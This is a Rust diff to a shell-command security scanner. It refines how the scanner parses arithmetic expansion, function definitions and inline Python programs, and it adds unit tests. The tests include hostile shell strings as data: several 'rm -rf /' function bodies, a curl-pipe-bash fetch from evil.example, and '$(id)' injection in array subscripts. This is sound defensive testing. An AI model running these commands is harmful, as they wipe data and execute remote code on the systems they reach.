@@ -3308,6 +3308,88 @@ fn capture_shell_body(
     None
 }
 
+/// Arithmetic recursively evaluates variable values and array subscripts.
+/// Only change the legacy shell-group interpretation when every expression
+/// token is numeric syntax or one of these fixed numeric-output substitutions.
+/// Unknown output/parameters retain the ordinary conservative analysis path.
+fn posix_arithmetic_is_numeric(raw: &str, depth: usize, remaining: &mut usize) -> bool {
+    if depth >= 8 || *remaining == 0 {
+        return false;
+    }
+    *remaining -= 1;
+    let bytes = raw.as_bytes();
+    let mut index = 0;
+    while index < bytes.len() {
+        let byte = bytes[index];
+        if byte.is_ascii_digit()
+            || byte.is_ascii_whitespace()
+            || b"()+-*/%<>=!~&|^?:,".contains(&byte)
+        {
+            index += 1;
+            continue;
+        }
+        if byte != b'$' || bytes.get(index + 1) != Some(&b'(') {
+            return false;
+        }
+        let Some(close) = find_substitution_close(raw, index + 1, ShellType::Posix) else {
+            return false;
+        };
+        let body = &raw[index + 2..close];
+        if body.starts_with('(') && body.ends_with(')') {
+            if !posix_arithmetic_is_numeric(body, depth + 1, remaining) {
+                return false;
+            }
+        } else if !posix_substitution_has_fixed_numeric_output(body) {
+            return false;
+        }
+        index = close + 1;
+    }
+    true
+}
+
+fn posix_substitution_has_fixed_numeric_output(body: &str) -> bool {
+    let segments = tokenize::tokenize(body, ShellType::Posix);
+    let [segment] = segments.as_slice() else {
+        return false;
+    };
+    if segment.raw != body.trim()
+        || !tokenize::leading_env_assignments(body).is_empty()
+        || segment.preceding_separator.is_some()
+    {
+        return false;
+    }
+    let Some(command) = segment
+        .command
+        .as_deref()
+        .and_then(|word| static_wrapper_word(word, ShellType::Posix))
+    else {
+        return false;
+    };
+    let Some(args) = segment
+        .args
+        .iter()
+        .map(|word| static_wrapper_word(word, ShellType::Posix))
+        .collect::<Option<Vec<_>>>()
+    else {
+        return false;
+    };
+    if matches!(command.as_str(), "date" | "/bin/date" | "/usr/bin/date") {
+        return args == ["+%s"];
+    }
+    if !matches!(
+        command.as_str(),
+        "printf" | "/bin/printf" | "/usr/bin/printf"
+    ) {
+        return false;
+    }
+    let digits = |value: &str| !value.is_empty() && value.bytes().all(|byte| byte.is_ascii_digit());
+    match args.as_slice() {
+        [value] => digits(value),
+        [format, value] if matches!(format.as_str(), "%s" | "%s\\n") => digits(value),
+        _ => false,
+    }
+}
+
 fn capture_executable_body(
     raw: &str,
     open: usize,
@@ -3322,14 +3404,28 @@ fn capture_executable_body(
     };
     if let Some(close) = close {
         if let Some(body) = raw.get(open + 1..close) {
-            bodies.push(ExecutableBody {
-                input: body.to_string(),
-                shell,
-                origin: Some(ExecutableBodyOrigin {
-                    parent_range: open + 1..close,
-                    relation,
-                }),
-            });
+            if shell == ShellType::Posix
+                && raw.as_bytes().get(open.wrapping_sub(1)) == Some(&b'$')
+                && body.starts_with('(')
+                && body.ends_with(')')
+                && posix_arithmetic_is_numeric(body, 0, &mut 128)
+            {
+                // Arithmetic is an argv expansion, not a shell command group.
+                // Keep its complete expression in a data position so nested
+                // substitutions are still analyzed without treating their
+                // output as an executable command name. This synthetic body
+                // has no exact source-span identity.
+                bodies.push(ExecutableBody::without_origin(format!(": {body}"), shell));
+            } else {
+                bodies.push(ExecutableBody {
+                    input: body.to_string(),
+                    shell,
+                    origin: Some(ExecutableBodyOrigin {
+                        parent_range: open + 1..close,
+                        relation,
+                    }),
+                });
+            }
         }
         return Some(close + 1);
     }
@@ -3634,6 +3730,26 @@ fn parse_posix_function_definition(raw: &str, start: usize) -> PosixFunctionPars
         },
         end: close + 1,
     }
+}
+
+/// Locate only the literal body delimiter after an unsupported function name.
+/// The caller already retained a gap; recovering the body keeps visible threats
+/// available without claiming the name or invocation is statically resolved.
+fn unresolved_posix_function_body(
+    raw: &str,
+    after_keyword: usize,
+) -> Option<(std::ops::Range<usize>, usize)> {
+    let bytes = raw.as_bytes();
+    let name_start = skip_posix_horizontal_whitespace(raw, after_keyword);
+    let after_name = posix_shell_word_end(raw, name_start)?;
+    let mut open = skip_posix_trivia(raw, after_name);
+    if bytes.get(open) == Some(&b'(') {
+        let after_paren = skip_posix_horizontal_whitespace(raw, open + 1);
+        if bytes.get(after_paren) == Some(&b')') {
+            open = skip_posix_trivia(raw, after_paren + 1);
+        }
+    }
+    matches!(bytes.get(open), Some(b'{' | b'(')).then_some((name_start..after_name, open))
 }
 
 fn posix_assignment_word_at(raw: &str, start: usize) -> bool {
@@ -5075,8 +5191,10 @@ fn push_control_prefix_body(
         return;
     }
     let body = args.join(" ");
-    let first = args.first().and_then(|arg| static_wrapper_word(arg, shell));
-    if first.is_none() {
+    let first_is_static = args
+        .first()
+        .is_some_and(|arg| crate::rules::command::command_name_is_statically_bound(arg, shell));
+    if !first_is_static {
         record_shell_execution_gap(scan, ShellExecutionGap::AmbiguousExecutableBody);
     } else if !body.trim().is_empty() {
         scan.bodies
@@ -7300,6 +7418,16 @@ fn contains_literal_posix_dispatch_mutation_bounded(
             {
                 return true;
             }
+            // A function-shaped string inside one quoted argv word is data.
+            // Consume that complete lexical word before considering another
+            // definition boundary. Merely walking bytes would mistake Python
+            // `sys.stdin.read()` (and quoted documentation) for a shell header.
+            if at_boundary {
+                if let Some(end) = posix_shell_word_end(&segment.raw, index) {
+                    index = end;
+                    continue;
+                }
+            }
             index += 1;
         }
 
@@ -7711,24 +7839,30 @@ fn posix_non_shell_interpreter_input_mode(
     Some(PosixInterpreterInputMode::StdinProgram)
 }
 
+/// Return only a Python program selected by a leading literal `-c`. A later
+/// `-c` after a script, `-`, `--`, or `-m` is script argv, not source. Startup
+/// options stay outside this proof: `-i` may execute stdin afterward, and
+/// `-W` / `-X` can import code before the otherwise fixed inline program.
+pub(crate) fn literal_posix_python_inline_program(args: &[String]) -> Option<String> {
+    let first = static_wrapper_word(args.first()?, ShellType::Posix)?;
+    if !first.starts_with("-c") {
+        return None;
+    }
+    match posix_non_shell_interpreter_input_mode("python3", args) {
+        Some(PosixInterpreterInputMode::InlineProgram(body)) => Some(body),
+        _ => None,
+    }
+}
+
 fn posix_inline_program_may_execute_stdin(command: &str, body: &str) -> bool {
     if !matches!(command, "python" | "python2" | "python3") {
         return true;
     }
 
-    // Inline programs are Turing-complete and can disguise an fd-0 read or
-    // dynamic execution without spelling a recognizable primitive. Prove only
-    // the deliberately tiny literal-output form needed here; every other body
-    // retains the conservative may-execute-stdin result.
-    let body = body.trim();
-    let Some(argument) = body
-        .strip_prefix("print(")
-        .and_then(|argument| argument.strip_suffix(')'))
-    else {
-        return true;
-    };
-    let argument = argument.trim();
-    !(argument.is_empty() || argument.bytes().all(|byte| byte.is_ascii_digit()))
+    // Keep this join conservative. The shared literal-output proof consumes
+    // no stdin and cannot hide a call; richer data parsers retain their flow
+    // context even when the direct pipe rule recognizes them as data readers.
+    !crate::rules::command::python_body_is_literal_output(body)
 }
 
 fn posix_stdout_may_depend_on_stdin(command: &str, args: &[String], receives_parent: bool) -> bool {
@@ -8516,7 +8650,41 @@ fn lexical_executable_substitutions_bounded(
                     incomplete = true;
                     break;
                 }
-                PosixFunctionParse::NotDefinition => {}
+                PosixFunctionParse::NotDefinition => {
+                    // Zsh accepts quoted and expanded names after `function`,
+                    // although Bash rejects them. The generic POSIX mode cannot
+                    // bind that dispatch mutation to a literal Bash function.
+                    if let Some(first_end) = posix_shell_word_end(raw, i)
+                        .filter(|end| is_strict_posix_reserved_word(&raw[i..*end], "function"))
+                    {
+                        gap.get_or_insert(ShellExecutionGap::AmbiguousExecutableBody);
+                        if let Some((name, open)) = unresolved_posix_function_body(raw, first_end) {
+                            // The outer walk skips this recovered definition.
+                            // Preserve substitutions in its name as data-position
+                            // source for the existing bounded child-body driver.
+                            // The synthetic prefix has no exact source origin.
+                            bodies.push(ExecutableBody::without_origin(
+                                format!(": {}", &raw[name]),
+                                shell,
+                            ));
+                            let Some(next) = capture_executable_body(
+                                raw,
+                                open,
+                                shell,
+                                ExecutableRelation::Unknown,
+                                &mut bodies,
+                            ) else {
+                                incomplete = true;
+                                break;
+                            };
+                            i = next;
+                            command_start = false;
+                            word_start = false;
+                            assignment_word = false;
+                            continue;
+                        }
+                    }
+                }
             }
         }
 
@@ -16309,6 +16477,128 @@ mod tests {
         assert!(invoked
             .iter()
             .any(|finding| { finding.rule_id == crate::verdict::RuleId::BlastWritesSystemPath }));
+    }
+
+    #[test]
+    fn issue_260_bracket_test_conditions_keep_static_command_identity() {
+        for input in [
+            r#"if [ -n "$X" ]; then echo yes; fi"#,
+            r#"while [ -n "$X" ]; do echo y; done"#,
+            r#"until [ -n "$X" ]; do echo y; done"#,
+            r#"if test -n "$X"; then [ -z "$Y" ]; elif [ -f file ]; then echo ok; fi"#,
+            r#"if [[ -n "$X" ]]; then echo yes; fi"#,
+        ] {
+            let scan = executable_substitution_scan(input, ShellType::Posix);
+            assert!(scan.gap.is_none(), "{input:?}: {scan:?}");
+            assert!(!scan.bodies.is_empty(), "condition/body was lost: {input}");
+        }
+        for input in [
+            r#"if "$COMMAND"; then echo yes; fi"#,
+            "while ${COMMAND}; do :; done",
+        ] {
+            assert!(executable_substitution_scan(input, ShellType::Posix)
+                .gap
+                .is_some());
+        }
+    }
+
+    #[test]
+    fn issue_260_arithmetic_recovers_substitutions_in_data_position() {
+        for input in [
+            "echo $(( $(date +%s) - 100 ))",
+            r#"echo "$(( $(date +%s) - 100 ))""#,
+            "echo $(( 1 + $(printf 2) + $(printf 3) ))",
+            "echo $(( 1 + $(( $(printf 2) * 3 )) ))",
+        ] {
+            let scan = executable_substitution_scan(input, ShellType::Posix);
+            assert!(scan.gap.is_none(), "{input}: {scan:?}");
+            assert!(!scan.bodies.is_empty());
+            for body in scan.bodies {
+                assert!(
+                    executable_substitution_scan(&body.input, body.shell)
+                        .gap
+                        .is_none(),
+                    "{body:?}"
+                );
+            }
+        }
+        for input in [
+            "echo $(( $(date +%s) - 100 )",
+            "echo $(( $(date +%s - 100 ))",
+        ] {
+            assert!(
+                executable_substitution_scan(input, ShellType::Posix)
+                    .gap
+                    .is_some(),
+                "{input}"
+            );
+        }
+    }
+
+    #[test]
+    fn issue_260_unknown_arithmetic_values_keep_their_execution_gap() {
+        for input in [
+            "echo $(( $PAYLOAD - 100 ))",
+            "echo $(( ${PAYLOAD} - 100 ))",
+            "echo $(( array[$INDEX] - 100 ))",
+            "echo $(( $(cat payload.txt) - 100 ))",
+            "echo $(( $(printf 'array[$(id)]') - 100 ))",
+            "date(){ printf 'array[$(id)]'; }; echo $(( $(date +%s) - 100 ))",
+            "alias date=cat\necho $(( $(date +%s) - 100 ))",
+        ] {
+            let findings =
+                crate::rules::command::check(input, ShellType::Posix, None, ScanContext::Exec);
+            assert!(
+                findings
+                    .iter()
+                    .any(|finding| finding.rule_id == crate::verdict::RuleId::AnalysisIncomplete),
+                "{input}: {findings:?}"
+            );
+        }
+    }
+
+    #[test]
+    fn issue_264_quoted_function_headers_do_not_mutate_shell_dispatch() {
+        for input in [
+            "echo hi | python3 -c 'import sys; print(sys.stdin.read())'",
+            "printf '%s' 'f(){ rm -rf /; }' | cat",
+            "printf '%s' \"f(){ rm -rf /; }\" | cat",
+            "true && echo 'read()'",
+            r#"true && printf '%s' function '"$NAME"' '{ printf marker; }'"#,
+            "if true; then echo 'f()'; fi",
+        ] {
+            let scan = executable_substitution_scan(input, ShellType::Posix);
+            assert!(scan.gap.is_none(), "{input}: {scan:?}");
+        }
+        for input in [
+            "true && f(){ rm -rf /; }; f",
+            "if true; then f(){ rm -rf /; }; fi; f",
+            "true && eval 'f(){ rm -rf /; }'; f",
+            "true && \"$NAME\"(){ rm -rf /; }; f",
+            "true && function \"$NAME\" { rm -rf /; }; f",
+            "function \"$NAME\" { rm -rf /; }; f",
+            "true && function \"f\"() { rm -rf /; }; f",
+        ] {
+            assert!(
+                executable_substitution_scan(input, ShellType::Posix)
+                    .gap
+                    .is_some(),
+                "{input}"
+            );
+        }
+    }
+
+    #[test]
+    fn issue_264_quoted_data_keeps_live_command_substitutions() {
+        let input = r#"true && echo "f(){ data; } $(curl https://evil.example/payload | bash)""#;
+        let findings =
+            crate::rules::command::check(input, ShellType::Posix, None, ScanContext::Exec);
+        assert!(
+            findings
+                .iter()
+                .any(|finding| finding.rule_id == crate::verdict::RuleId::CurlPipeShell),
+            "{findings:?}"
+        );
     }
 
     #[test]
